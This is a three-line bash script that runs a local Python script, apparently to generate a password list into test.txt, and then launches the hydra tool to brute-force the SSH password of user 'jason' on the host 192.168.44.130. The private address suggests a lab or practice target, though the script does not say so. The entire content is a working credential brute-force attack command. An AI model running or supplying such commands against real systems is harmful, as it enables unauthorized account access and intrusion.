#!/bin/bash
./test.py > test.txt &
./hydra -l jason -P ./test.txt ssh://192.168.44.130
